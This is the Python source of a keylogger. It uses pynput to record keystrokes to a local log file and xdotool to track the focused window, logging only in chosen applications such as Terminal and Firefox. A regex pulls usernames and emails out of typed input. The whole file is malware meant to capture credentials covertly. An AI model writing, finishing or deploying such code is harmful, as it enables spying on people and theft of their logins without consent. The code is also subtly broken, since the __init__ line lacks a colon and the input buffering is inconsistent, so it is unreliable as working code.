import os
import subprocess
import time
import re
from pynput import keyboard

class KeyLogger:
    def __init__(self, target_apps=None)
        self.log_file = "log.txt"  # Log file to store keystrokes
        self.current_input = ""  # Buffer for current input
        self.sensitive_data = []  # To store captured sensitive data (usernames/passwords)
        self.target_apps = target_apps if target_apps else []  # List of target applications
        self.current_window = ""  # To track the current active window
        
        # Initialize the log file
        with open(self.log_file, "w") as f:
            f.write("Keylogger Started.\n")

    def append_to_log(self, string):
        # Append messages to the log file
        with open(self.log_file, "a") as f:
            f.write(string)

    def capture_sensitive_data(self):
        # Detect patterns for username/email or password
        if "username" in self.current_input.lower() or "email" in self.current_input.lower():
            match = re.search(r"\busername[: ]*(\S+)|\bemail[: ]*(\S+)", self.current_input, re.IGNORECASE)
            if match:
                username = match.group(1) or match.group(2)
                self.sensitive_data.append(f"Captured Username/Email: {username}\n")
                self.append_to_log(f"Captured Username/Email: {username}\n")
        
        if "password" in self.current_input.lower():
            # Fake detection example; replace with better logic for real cases
            self.sensitive_data.append(f"Captured Password: ********\n")
            self.append_to_log("Captured Password: ********\n")

        self.current_input = ""  # Reset input buffer after checking

    def log_keystroke(self, key):
        try:
            current_key = str(key.char)  # Regular characters
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
                self.current_input += current_key
            elif key == keyboard.Key.enter:
                current_key = "\n"
                self.append_to_log(self.current_input + "\n")  # Log the current buffer
                self.capture_sensitive_data()  # Check for sensitive data
                self.current_input = ""  # Reset the input buffer
            elif key == keyboard.Key.backspace:
                current_key = " [BACKSPACE] "
                self.current_input = self.current_input[:-1]  # Simulate backspace
            elif key == keyboard.Key.tab:
                current_key = " [TAB] "
                self.current_input += current_key
            else:
                current_key = f" [{key}] "  # Special keys like Ctrl, Alt

        self.append_to_log(current_key)

    def get_active_window(self):
        # Use xdotool to get the name of the active window
        try:
            result = subprocess.run(
                ["xdotool", "getwindowfocus", "getwindowname"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return result.stdout.strip()
        except FileNotFoundError:
            return "Unknown Window (xdotool not installed)"

    def on_key_press(self, key):
        # Detect active window
        active_window = self.get_active_window()
        if active_window != self.current_window:
            # Log the window change
            self.current_window = active_window
            self.append_to_log(f"\n[Switched to: {self.current_window}]\n")
            # Reset the input buffer for the new window
            self.current_input = ""

        # Check if the current window matches target applications
        if any(app.lower() in self.current_window.lower() for app in self.target_apps):
            self.log_keystroke(key)
            # Log the input to the file
            self.append_to_log(self.current_input)
            self.current_input = ""  # Reset the buffer after logging

    def start(self):
        # Start the keyboard listener
        key_listener = keyboard.Listener(on_press=self.on_key_press)
        key_listener.start()

        # Keep the main thread running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Keylogger stopped.")

if __name__ == "__main__":
    # Specify target applications to track
    target_apps = ["Terminal", "Gedit", "Firefox"]  # Customize as per your requirement

    keylogger = KeyLogger(target_apps)
    keylogger.start()
